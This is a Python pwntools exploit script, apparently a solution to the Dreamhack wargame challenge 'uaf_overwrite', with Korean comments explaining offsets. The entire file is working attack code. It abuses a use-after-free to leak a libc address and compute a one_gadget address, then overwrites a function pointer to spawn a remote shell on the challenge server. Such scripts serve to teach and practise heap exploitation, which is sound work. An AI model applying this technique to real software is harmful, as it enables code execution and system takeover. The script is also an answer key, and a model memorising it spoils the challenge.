from pwn import *

# Local
#p = process('./uaf_overwrite')

# Remote
p = remote('host3.dreamhack.games', 20226)

def slog(sym, val): success(sym + ': ' + hex(val))

def human(weight, age):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b': ', str(weight).encode())
    p.sendlineafter(b': ', str(age).encode())

def robot(weight):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b': ', str(weight).encode())

def custom(size, data, idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)
    p.sendlineafter(b': ', str(idx).encode())

# UAF to calculate the `libc_base`
custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', 0)
custom(0x500, b'B', -1) # data 값이 'B'가 아니라 'C'가 된다면, offset은 0x3ebc42 가 아니라 0x3ebc43이 됩니다.

lb = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebc42
og = lb + 0x10a41c # 제약 조건을 만족하는 원가젯 주소 계산

slog('libc_base', lb)
slog('one_gadget', og)

# UAF to manipulate `robot->fptr` & get shell
human(1, og)
robot(1)

p.interactive()